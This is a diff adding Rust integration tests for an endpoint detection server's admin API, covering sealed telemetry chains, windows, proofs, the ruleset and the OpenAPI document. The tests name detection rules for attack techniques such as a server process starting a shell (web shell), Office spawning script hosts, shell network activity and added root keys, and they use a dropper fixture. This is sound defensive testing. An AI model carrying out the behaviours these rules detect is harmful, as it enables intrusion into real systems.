+        (chain["epoch"].as_u64(), chain["next_window"].as_u64(), chain["next_index"].as_u64(), chain["head"].as_str(), chain["proven_window"].is_null()),
+        (Some(1), Some(4), Some(6), Some(hash_to_hex(&host.ledger.head).as_str()), true)
+    );
+    assert_eq!(chain["totals"], serde_json::json!({ "windows": 4, "events": 6, "opened": 2, "gaps": 1 }));
+    let windows = chain["windows"].as_array().unwrap();
+    assert_eq!(windows.iter().map(|window| window["window"].as_u64().unwrap()).collect::<Vec<_>>(), [3, 2, 1, 0], "newest first");
+    let received_at = windows[2]["received_at"].as_i64().unwrap();
+    assert!((chrono::Utc::now().timestamp() - received_at).abs() < 60);
+    assert_eq!(
+        windows[2],
+        serde_json::json!({ "window": 1, "epoch": 1, "first_index": 2, "count": 2, "opened": 1, "fresh": false, "gap": false, "received_at": received_at, "proof": "pending" })
+    );
+    assert_eq!((&windows[3]["fresh"], &windows[3]["opened"], &windows[0]["gap"], &windows[0]["opened"]), (&serde_json::json!(true), &serde_json::json!(1), &serde_json::json!(true), &serde_json::json!(0)));
+
+    let journal = host.ledger.journal(2);
+    assert_eq!(host.prove(&app, &journal).await.0, StatusCode::OK);
+    let (_, chain) = call(&app, "GET", "/api/admin/agents/chain-host/chain?limit=3", Some(&reader), None).await;
+    assert_eq!(chain["proven_window"], 1);
+    let proofs: Vec<&str> = chain["windows"].as_array().unwrap().iter().map(|window| window["proof"].as_str().unwrap()).collect();
+    assert_eq!(proofs, ["pending", "pending", "verified"], "the limit cuts the oldest windows off");
+    let (_, chain) = call(&app, "GET", "/api/admin/agents/chain-host/chain?limit=100000", Some(&reader), None).await;
+    assert_eq!(chain["windows"].as_array().unwrap().len(), 4);
+
+    let (status, empty) = call(&app, "GET", "/api/admin/agents/empty-host/chain", Some(&reader), None).await;
+    assert_eq!(status, StatusCode::OK);
+    assert_eq!(
+        empty,
+        serde_json::json!({
+            "epoch": 0, "next_window": 0, "next_index": 0, "head": hash_to_hex(&GENESIS), "proven_window": null,
+            "totals": { "windows": 0, "events": 0, "opened": 0, "gaps": 0 }, "windows": []
+        })
+    );
+
+    assert_eq!(call(&app, "GET", "/api/admin/agents/no-such-host/chain", Some(&reader), None).await.0, StatusCode::NOT_FOUND);
+    assert_eq!(call(&app, "GET", "/api/admin/agents/chain-host/chain", None, None).await.0, StatusCode::UNAUTHORIZED);
+}
+
+#[tokio::test]
+async fn test_the_console_reads_one_window_with_its_sealed_events_and_releases() {
+    let (app, pool) = create_proving_app().await;
+    let mut host = enroll_endpoint(&app, &pool, "window-host").await;
+    tell_a_story(&app, &mut host).await;
+    let reader = admin_token("user");
+    let sealed = &host.ledger.kept[1].0;
+
+    let (status, window) = call(&app, "GET", "/api/admin/agents/window-host/windows/1", Some(&reader), None).await;
+    assert_eq!(status, StatusCode::OK);
+    assert_eq!(
+        window["header"],
+        serde_json::json!({
+            "epoch": 1, "window": 1, "first_index": 2, "count": 2, "fresh": false, "gap": false,
+            "prev_head": hash_to_hex(&sealed.prev_head), "root": hash_to_hex(&sealed.root), "head": hash_to_hex(&sealed.head),
+        })
+    );
+    assert_eq!((&window["proving"], &window["proof"], window["received_at"].is_i64()), (&serde_json::json!(true), &serde_json::json!("pending"), true));
+
+    let opened_as: String = sqlx::query_scalar("SELECT id FROM events WHERE agent_id = 'window-host' AND event_type = 'process' AND data LIKE '%/bin/sh%'").fetch_one(&pool).await.unwrap();
+    let events = window["events"].as_array().unwrap();
+    assert_eq!(events.len(), 2);
+    assert_eq!(events[0], serde_json::json!({ "index": 2, "leaf": events[0]["leaf"], "ciphertext_bytes": 272, "opened": false }));
+    assert_eq!(events[1], serde_json::json!({ "index": 3, "leaf": events[1]["leaf"], "ciphertext_bytes": 272, "opened": true, "event_id": opened_as }));
+    assert!(events.iter().all(|event| event["leaf"].as_str().is_some_and(|leaf| leaf.len() == 64)));
+    assert_eq!(
+        window["releases"],
+        serde_json::json!([{ "trigger": 3, "rule": "server-child", "title": "Server process started a shell", "technique": "T1505.003", "level": "high", "context": [0], "proven": false }])
+    );
+
+    let journal = host.ledger.journal(3);
+    assert_eq!(host.prove(&app, &journal).await.0, StatusCode::OK);
+    let (_, window) = call(&app, "GET", "/api/admin/agents/window-host/windows/1", Some(&reader), None).await;
+    assert_eq!((&window["proof"], &window["releases"][0]["proven"]), (&serde_json::json!("verified"), &serde_json::json!(true)));
+    let (_, quiet_window) = call(&app, "GET", "/api/admin/agents/window-host/windows/2", Some(&reader), None).await;
+    assert_eq!((quiet_window["events"].as_array().unwrap().len(), quiet_window["releases"].as_array().unwrap().len()), (1, 0));
+
+    for missing in ["/api/admin/agents/window-host/windows/3", "/api/admin/agents/no-such-host/windows/0"] {
+        assert_eq!(call(&app, "GET", missing, Some(&reader), None).await.0, StatusCode::NOT_FOUND);
+    }
+    assert_eq!(call(&app, "GET", "/api/admin/agents/window-host/windows/1", None, None).await.0, StatusCode::UNAUTHORIZED);
+}
+
+#[tokio::test]
+async fn test_the_console_reads_the_rules_and_the_proof_programs_the_server_accepts() {
+    let (app, pool) = create_proving_app().await;
+    let mut host = enroll_endpoint(&app, &pool, "ruleset-host").await;
+    host.deliver(&app, &dropper_chain()).await;
+    let reader = admin_token("user");
+
+    let (status, ruleset) = call(&app, "GET", "/api/admin/ruleset", Some(&reader), None).await;
+    assert_eq!(status, StatusCode::OK);
+    assert_eq!(ruleset["image_ids"], serde_json::json!([hash_to_hex(&TEST_IMAGE_ID)]));
+    let rules = ruleset["rules"].as_array().unwrap();
+    assert_eq!(rules.len(), zedr_rules::RuleId::ALL.len());
+    let rule = |id: &str| rules.iter().find(|rule| rule["id"] == id).unwrap();
+    assert_eq!(
+        rule("office-child"),
+        &serde_json::json!({ "id": "office-child", "title": "Office application started a script host", "technique": "T1204.002", "level": "high", "opens": "process and parent", "releases": 1 })
+    );
+    assert_eq!((&rule("shell-network")["opens"], &rule("shell-network")["level"], &rule("shell-network")["releases"]), (&serde_json::json!("event, process and parent"), &serde_json::json!("medium"), &serde_json::json!(1)));
+    assert_eq!((&rule("root-key-added")["opens"], &rule("root-key-added")["releases"]), (&serde_json::json!("autostart item"), &serde_json::json!(0)));
+    assert_eq!(rules.iter().map(|rule| rule["releases"].as_i64().unwrap()).sum::<i64>(), 7);
+
+    let (default_app, _) = create_test_app_with_pool().await;
+    let (_, from_env) = call(&default_app, "GET", "/api/admin/ruleset", Some(&reader), None).await;
+    assert_eq!(from_env["image_ids"], serde_json::json!([TEST_GUEST_IMAGE_ID]), "a deployment names the programs it accepts in ZEDR_GUEST_IMAGE_IDS");
+    assert_eq!(call(&app, "GET", "/api/admin/ruleset", None, None).await.0, StatusCode::UNAUTHORIZED);
+}
+
+#[tokio::test]
+async fn test_the_api_document_describes_the_sealed_telemetry_endpoints() {
+    let app = create_test_app().await;
+    let (status, document) = call(&app, "GET", "/api-docs/openapi.json", None, None).await;
+    assert_eq!(status, StatusCode::OK);
+
+    for path in ["/api/windows", "/api/proofs", "/api/admin/agents/{id}/chain", "/api/admin/agents/{id}/windows/{window}", "/api/admin/ruleset"] {
+        assert!(document["paths"][path].is_object(), "{} is documented", path);
+    }
+    for schema in ["SealedWindow", "Release", "SealedWindowAck", "ChainPosition", "ProofSubmission", "ProofAck", "ChainView", "WindowSummary", "WindowView", "SealedEventView", "ReleaseView", "RulesetView", "RuleView"] {
+        assert!(document["components"]["schemas"][schema].is_object(), "{} is described", schema);
+    }
+    let refused = &document["paths"]["/api/windows"]["post"]["responses"]["409"]["content"]["application/json"]["schema"]["$ref"];
+    assert_eq!(refused, "#/components/schemas/ChainPosition", "an agent can tell what a refused window is answered with");
 }
